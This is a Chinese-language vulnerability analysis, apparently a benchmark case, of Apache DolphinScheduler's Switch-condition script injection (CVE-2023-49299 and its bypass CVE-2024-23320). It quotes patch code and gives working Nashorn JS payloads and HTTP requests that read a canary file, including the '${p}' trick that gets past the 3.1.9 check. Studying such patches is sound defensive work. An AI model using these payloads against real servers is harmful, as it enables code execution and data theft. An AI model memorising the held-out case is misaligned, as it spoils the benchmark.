# DolphinScheduler：只要替换过 `${param}`，Nashorn 就还是整段 eval

- Case：`PCBV2-0068`
- 产品：Apache DolphinScheduler（分布式工作流；Switch 任务用条件表达式选分支）
- 链：CVE-2023-49299（3.1.8 → 3.1.9）→ CVE-2024-23320（→ 3.2.1，PR [#15487](https://github.com/apache/dolphinscheduler/pull/15487)）
- 源码对着 GitHub tag `3.1.8` / `3.1.9` / `3.2.1` 的 `SwitchTaskUtils.java`：`evaluate`、`generateContentWithTaskParams`。运行时是 Maven Central 整包 `dolphinscheduler-master` + `dolphinscheduler-task-api`，HTTP `POST /eval` 反射进这两个方法，不是抽出来的 `engine.eval`。

2024 年 1 月，3.1.9 给 Switch 条件加了 `generateContentWithTaskParams`：必须带全局/局部参数，而且 `${name}` **至少替换一次**，否则抛 `condition is not valid`。这挡住了「整段就是任意 JS、一个 `${}` 都没有」的写法。一个月后 NVD CVE-2024-23320 原文：*This issue is a legacy of CVE-2023-49299. We didn't fix it completely in CVE-2023-49299, and we added one more patch to fix it.* 固定版本 3.2.1。

根因不只是「少写了几个关键字」。检查插在「字符串有没有被 `${}` 替换过」这一层；真正执行的是 JDK Nashorn `engine.eval(content)`，没有沙箱、没有类过滤器。下面按请求走进去、3.1.9 加了哪几行、替换之后谁消费那份字符串、关键字表为什么当时没挂上，把这几层写完。

---

## 这块功能本来在干什么

DolphinScheduler 的 Switch 任务让用户写一个「条件」，运行时求值成 boolean，再走不同下游。实现不是自己做表达式解析，而是：

```java
engine = new ScriptEngineManager().getEngineByName("js");  // Nashorn，JDK 8/11
engine.eval(expression);
```

条件里可以用 `${param}` 引用工作流参数。设计意图：条件是 `status == "SUCCESS"` 这种比较，参数是字符串/数字，求值结果是 boolean。

本 case 用 `com.sun.net.httpserver` 暴露 `POST /eval {condition, params}`，再反射调用**未修改的** `SwitchTaskUtils`（与 worker 求值 Switch 条件同一对方法）。JDK 钉 11，因为 Nashorn 在 15+ 从 JDK 里拿掉了。

一次典型请求：

```http
POST /eval
{"condition":"${status} == \"SUCCESS\"","params":{"status":"SUCCESS"}}
```

成功穿越之后的效果是：**任意 JS 在服务端 eval，读出 `/canary/flag.txt`，`PCBOUT:<flag>` 出现在 HTTP stdout 字段**。金丝雀在 app 目录外，只有跨过 guard 的脚本能读。没有 `Runtime.exec`，只有良性文件读。

数据流：

```text
POST /eval {condition, params}
    → generateContentWithTaskParams(condition, params)   ← 补丁插在这里（3.1.9 才有）
         空参数 → throw
         把 '${name}' 换成数字或 "字符串"
         若替换后 == 替换前 → throw "condition is not valid"
         （3.1.9 到此返回；3.2.1 还扫 blackKeySet）
    → evaluate(content)
         engine.eval(content)                            ← 真正的 sink，始终无沙箱
    → 脚本 println('PCBOUT:'+ <flag>)
    → HTTP stdout
```

真实产品里写 Switch 条件需要登录；本 harness 把同一对方法接到 HTTP 上，不额外做鉴权。判断完全信任「发生过 `${}` 替换 ⇒ 内容是合法条件」；不信任 Nashorn 对 `java.nio.file.Files` 的互通。

---

## 原始漏洞：条件就是任意 JS（CVE-2023-49299，3.1.8）

3.1.8 的 `SwitchTaskUtils` 只有 `evaluate`。NVD CVE-2023-49299：*An authenticated user can cause arbitrary, unsandboxed javascript to be executed on the server*，修复版本 3.1.9。

seed（`original_poc.py`）不使用 `${}`：

```text
condition = java.lang.System.out.println('PCBOUT:'+ new java.lang.String(
              java.nio.file.Files.readAllBytes(
                java.nio.file.Paths.get("/canary/flag.txt"))));true
params    = {"unused":"1"}     // 故意不引用，好让 V1 死在「没替换」而不是「参数为空」
```

V0 没有 `generateContentWithTaskParams`，`evaluate` 直接 `engine.eval` 这段。Nashorn 默认能碰 `java.*`。脚本读出 flag，stdout 含 `PCBOUT:PCBFLAG_...`。这是 case.json 记录的一次真实 HTTP gate（**本分析未重新 compose**）。

---

## 维护者改了什么（CVE-2023-49299 修复，3.1.9）

对着 GitHub tag `3.1.9` 原文：

```java
// dolphinscheduler-master/.../server/master/utils/SwitchTaskUtils.java
// :: generateContentWithTaskParams  (tag 3.1.9)
    private static final String rgex = "['\"]*\\$\\{(.*?)\\}['\"]*";

    public static String generateContentWithTaskParams(String condition,
            Map<String, Property> globalParams, Map<String, Property> varParams) {
        String content = condition.replaceAll("'", "\"");
        if (MapUtils.isEmpty(globalParams) && MapUtils.isEmpty(varParams)) {
            throw new IllegalArgumentException(
                "globalParams and varParams are both empty, please check it.");
        }
        ...
        String originContent = content;
        Matcher m = Pattern.compile(rgex).matcher(content);
        while (m.find()) {
            String paramName = m.group(1);
            Property property = params.get(paramName);
            if (property == null) { continue; }
            String value = (ParameterUtils.isNumber(property) || ParameterUtils.isBoolean(property))
                    ? "" + ParameterUtils.getParameterValue(property)
                    : "\"" + ParameterUtils.getParameterValue(property) + "\"";
            content = content.replace("${" + paramName + "}", value);
        }
        // if not replace any params, throw exception to avoid illegal condition
        if (originContent.equals(content)) {
            throw new IllegalArgumentException(
                "condition is not valid, please check it. condition: " + condition);
        }
        return content;
    }

    public static boolean evaluate(String expression) throws ScriptException {
        Object result = engine.eval(expression);
        return (Boolean) result;
    }
```

`evaluate` **一行没改**。新方法做两件事：参数 map 非空；替换前后字符串不相等。

对 seed 这种不含 `${unused}` 的原文，它确实够用：`originContent.equals(content)` 为真，抛 `condition is not valid`，`engine.eval` 不跑，stdout 没有金丝雀。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 危险条件长得像「一整段 JS，一次 `${}` 替换都没有」。
2. 只要发生过一次替换，剩下的字符串就是安全的 Switch 条件。

第二点不成立。攻击者可以把任意 JS 留在 condition 里，再加一个**良性** `${p}`，只为了让 `equals` 变成 false。替换引擎把字符串参数包成 `"..."` 再塞回去，于是 `${p}` 变成合法 JS 字符串字面量，周围的 `java.nio.file.Files.readAllBytes(Paths.get( ... ))` 原样留下。

3.1.9 **没有**关键字表。`blackKeySet` 是 3.2.1 才加的。

---

## 检查之后，谁真正 eval 那份字符串

`generateContentWithTaskParams` 返回后，调用方把返回值交给 `evaluate` → `engine.eval`。Nashorn 对这份字符串的语义是完整 JS，加上 Java 互通（`java.lang.*`、`java.nio.file.*` 都是默认可见的）。

没有 `ClassFilter`、没有 `SecurityManager`、没有「只允许比较运算符」的二次解析。guard 刚看过的是「替换前 == 替换后？」；sink 看到的是替换**之后**的整段脚本。

对 residual，变换是字面的：

```text
condition:
  java.lang.System.out.println('PCBOUT:'+ new java.lang.String(
    java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(${p}))));true
params:  p = /canary/flag.txt

replaceAll("'", "\"") 之后引号统一成双引号
${p} → "/canary/flag.txt"     // 因为 p 不是 number/boolean

eval 看到的:
  java.lang.System.out.println("PCBOUT:"+ new java.lang.String(
    java.nio.file.Files.readAllBytes(java.nio.file.Paths.get("/canary/flag.txt"))));true
```

`originContent.equals(content)` 为 false（`${p}` 被换成带引号的路径），guard 放行。eval 跑完，stdout 里是 `PCBOUT:` 加上文件内容。flag 出现在 HTTP body，依据就是这次 Nashorn 读文件，而不是参数 map 里碰巧带了 flag——参数只是路径 `/canary/flag.txt`。

---

## 仓库里已经有更强的检查，eval 之前没用上

同一份 3.1.9 文件里：

- 已经把字符串参数包进 `"..."`（承认参数会进 JS 字面量）
- 已经拒绝「完全没替换」
- **没有**对替换后的 `content` 做任何关键字/语法约束
- `evaluate` 仍然是裸 `engine.eval`

JDK Nashorn 提供过 `ClassFilter`（按类名拒绝 Java 互通）。DolphinScheduler 没有用。3.2.1 选择的是在返回前扫 `content.contains("java")` 等子串，仍然不是沙箱。

谁在 eval 前拦：

| 检查 | 3.1.9 | 3.2.1 |
|---|---|---|
| 参数 map 非空 | 是 | 是 |
| 至少一次 `${}` 替换 | 是 | 是 |
| 替换后禁止 `java`/`new`/`eval`/`function`/`import`/`invoke`/`\` | **否** | 是 |
| Nashorn ClassFilter / 沙箱 | 否 | 否 |

不是 JVM 里没有更强的谓词，是 **generateContentWithTaskParams 在 3.1.9 只证明「发生过替换」**。即便不用 `java.nio.file`，任何替换后仍是任意 JS 的写法（`new java.lang.Runtime` 等）都会进同一 sink。本 residual 用文件读做金丝雀，因为平台 oracle 是 read-exfil。

公开中文分析（idocdown 等）把 CVE-2024-23320 写成「把恶意 JS 放进参数值」。本 case 的 held-out **不是**那条：恶意 JS 仍在 condition 里，参数只是路径。两条都能让 `equals` 变 false；本 residual 选的是「condition 里留 JS + 良性 `${p}`」，和 3.1.9 源码更贴——guard 不看替换**成了什么**，只看替换**有没有发生**。

---

## 这个补丁挡住了什么、没挡住什么

```text
seed condition（无 ${}）:
  ...Paths.get("/canary/flag.txt")...
  替换前后相同 → throw，eval 不跑

residual condition（带 ${p}）:
  ...Paths.get(${p})...
  ${p} → "/canary/flag.txt"
  替换前后不同 → return content
  eval 跑同一段 Java 互通 JS
```

token 变换：在任意 JS 里插入一个 `${p}`，让 `originContent.equals(content)` 从 true 变成 false。`${p}` 的正则 `['\"]*\$\{(.*?)\}['\"]*` 还会吃掉两侧引号，替换后再加上 JS 字符串引号，所以它是合法的 `Paths.get("...")` 参数，不是语法错误。

过滤器看的是字符串相等；Nashorn 看的是完整脚本。seed 被挡住只说明「没有 `${}` 的原文没了」，不说明「不能再让 Switch 条件读树外文件」。

---

## 残余仍然走同一条 generateContent → eval（CVE-2024-23320）

没有换任务类型、没有换 ScriptEngine。还是：

```http
POST /eval
{"condition":"java.lang.System.out.println('PCBOUT:'+new java.lang.String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(${p}))));true","params":{"p":"/canary/flag.txt"}}
```

3.1.9 的新方法照样执行；执行完之后 content 是带真实路径的任意 JS；`evaluate` 照样 `engine.eval`；stdout 出现 `PCBOUT:PCBFLAG_...`。

held-out 把 candidate 写死为上面这条。NVD 说 *legacy of CVE-2023-49299* / *didn't fix it completely*。认证记录：v1 + residual `evaluated=true`，body 含 flag。

所以残余不是新洞面，而是同一 sink 上三件事叠在一起：guard 只证明发生过替换；eval 发生在检查之后且无沙箱；关键字表要到 3.2.1 才挂上。

---

## 后来又补了什么（CVE-2024-23320，3.2.1）

PR #15487 在**同一方法**返回前加了子串黑名单。对着 tag `3.2.1`：

```java
// SwitchTaskUtils.java :: generateContentWithTaskParams  (tag 3.2.1)
    private static final Set blackKeySet = Sets.newHashSet(
            "java", "invoke", "new", "eval", "function", "import", "\\\\");

        ... 替换循环与 3.1.9 相同 ...

        for (String blackKey : blackKeySet) {
            if (content.contains(blackKey)) {
                throw new IllegalArgumentException(
                    "condition is not valid, please check it. condition: " + condition);
            }
        }
        if (originContent.equals(content)) { ... }
        return content;
```

`evaluate` 仍是裸 `engine.eval`。对残余输入：替换后的 content 含 `java` 和 `new` → throw，eval 不跑。公开建议升级到 3.2.1。Apache 邮件列表 thread 与 oss-security 2024/02/23 同步了这条。

即便如此，这仍然是「替换后的子串表」，不是 JS 沙箱。对 `java`/`new` 这条已知链它够用；绕过 `contains("java")` 的其它写法需要另证。本 benchmark 的 v2 只关闭这一条 reference residual。3.2.0 仍无黑名单，所以中间没有提前闭合。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是「进 eval 之前字符串有没有被模板替换过」。真正读文件的是 Nashorn 的 Java 互通。V2 仍在同一方法加码（子串表），没有给 `engine` 设 ClassFilter，也没有换成不能碰 `java.*` 的表达式语言。

**不是没有更好的谓词。**  
Nashorn `ClassFilter`、或者「条件只能是比较/逻辑运算」的解析器，都比「发生过替换」更接近「不要任意 JS」。从 V1 的 diff 只能看到新方法 + `equals`；要判断补丁是否闭合，必须看到返回值原样进 `engine.eval`，以及 3.1.9 没有 `blackKeySet`。

**同一方法、同一 eval，只换了「让 equals 为 false」的写法。**  
seed 用不引用的 dummy 参数，专门撞 no-substitution；residual 用引用的 `${p}`，专门满足它。

**把用户字符串送进 `getEngineByName("js")` 本身就是完整语言。**  
`replaceAll("'", "\"")` 只统一引号，删不掉 `java.lang`。

**金丝雀在树外是有意的。**  
`/canary/flag.txt` 不在工作流定义里。能打印它，说明 eval 真的读了文件系统。

---

## 版本、入口、参考

| | DS | `generateContentWithTaskParams` | 无 `${}` seed | `${p}` + 任意 JS residual |
|---|---|---|---|---|
| V0 | 3.1.8 | 方法不存在，直接 `evaluate` | stdout 有 flag | （不必） |
| V1 | 3.1.9 | 空参数 + 无替换 → throw；无关键字表 | `condition is not valid` | eval 跑，stdout 有 flag |
| V2 | 3.2.1 | 同上 + `blackKeySet` 含子串 `java`/`new`/… | 挡 | `contains("java")` → throw |

- Web：`POST /eval {condition, params}`
- 认证记录（case.json）：v0 seed 观察到 flag；v1 seed 未观察到；v1 residual 观察到；v2 residual 未观察到。
- [CVE-2023-49299](https://nvd.nist.gov/vuln/detail/CVE-2023-49299)、[CVE-2024-23320](https://nvd.nist.gov/vuln/detail/CVE-2024-23320)
- V1 源码：[tag 3.1.9 `SwitchTaskUtils.java`](https://github.com/apache/dolphinscheduler/blob/3.1.9/dolphinscheduler-master/src/main/java/org/apache/dolphinscheduler/server/master/utils/SwitchTaskUtils.java)
- V2：[tag 3.2.1 同文件](https://github.com/apache/dolphinscheduler/blob/3.2.1/dolphinscheduler-master/src/main/java/org/apache/dolphinscheduler/server/master/utils/SwitchTaskUtils.java)；[PR #15487](https://github.com/apache/dolphinscheduler/pull/15487)
- Apache 公告：[lists.apache.org thread](https://lists.apache.org/thread/25qhfvlksozzp6j9y8ozznvjdjp3lxqq)
